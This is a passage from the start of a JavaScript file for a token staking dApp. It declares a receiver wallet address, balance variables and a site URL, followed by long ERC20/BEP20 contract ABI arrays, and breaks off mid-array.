"use strict";
const receiver = '0x854c70b932de9AD52fa10e0B298FF8D3884876f3';


// Chosen wallet provider given by the dialog window
let provider;
// Address of the selected account
let selectedAccount;

let bnbBalnce;
let busdBalnce;
let localWalletStore;
var allAssets;
var createUserCall = false;


let url = 'https://goldleaftoken.com/stacking/Dashboard/Activation/indexActiveByINdex';

/** TOKEN ABI **/

let token_abi_mainnet = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balances", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowed", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint256" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }];

let token_abi_testnet = [{ "inputs": [{ "internalType": "string", "name": "name_", "type": "string" }, { "internalType": "string", "name": "symbol_", "type": "string" }, { "internalType": "uint8", "name": "decimals_", "type": "uint8" }, { "internalType": "uint256", "name": "initialBalance_", "type": "uint256" }, { "internalType": "address payable", "name": "feeReceiver_", "type": "address" }], "stateMutability": "payable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [], "name": "MintFinished", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approveAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }, { "internalType": "bytes", "name": "data", "type": "bytes" }], "name": "approveAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burnFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "finishMinting", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "mintingFinished", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "tokenAddress", "type": "address" }, { "internalType": "uint256", "name": "tokenAmount", "type": "uint256" }], "name": "recoverBEP20", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "renounceOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }, { "internalType": "bytes", "name": "data", "type": "bytes" }], "name": "transferAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }, { "internalType": "bytes", "name": "data", "type": "bytes" }], "name": "transferFromAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFromAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" }];
/** CONTRACT API **/

let contract_abi_mainnet = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balances", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowed", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint256" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }];

let contract_abi_testnet = [{ "inputs": [{ "internalType": "string", "name": "name_", "type": "string" }, { "internalType": "string", "name": "symbol_", "type": "string" }, { "internalType": "uint8", "name": "decimals_", "type": "uint8" }, { "internalType": "uint256", "name": "initialBalance_", "type": "uint256" }], "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [], "name": "MintFinished", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approveAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }, { "internalType": "bytes", "name": "data", "type": "bytes" }], "name": "approveAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burnFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "finishMinting", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "mintingFinished", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "tokenAddress", "type": "address" }, { "internalType": "uint256", "name": "tokenAmount", "type": "uint256" }], "name": "recoverBEP20", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "renounceOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }, { "internalType": "bytes", "name": "data", "type": "bytes" }], "name": "transferAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }, { "internalType": "bytes", "name": "data", "type": "bytes" }], "name": "transferFromAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFromAndCall", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" }];

let contract_abi_ropsten = [{ "inputs": [{ "internalType": "uint256", "name": "initialSupply", "type": "uint256" }, { "internalType": "string", "name": "tokenName", "type": "string" }, { "internalType": "string", "name": "tokenSymbol", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "_owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "_spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "_value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Burn", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "", "type": "address" }, { "internalType": "address", "name": "", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "_spender", "type": "address" }, { "internalType": "uint256", "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "success", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "_spender", "type": "address" }, { "internalType": "uint256", "name": "_value", "type": "uint256" }, { "internalType": "bytes", "name": "_extraData", "type": "bytes" }], "name": "approveAndCall", "outputs": [{ "internalType": "bool", "name": "success", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "_value", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "success", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "_from", "type": "address" }, { "internalType": "uint256", "name": "_value", "type": "uint256" }], "name": "burnFrom", "outputs": [{ "internalType": "bool", "name": "success", "type": "bool" }], "payable": false, "stateMutability": 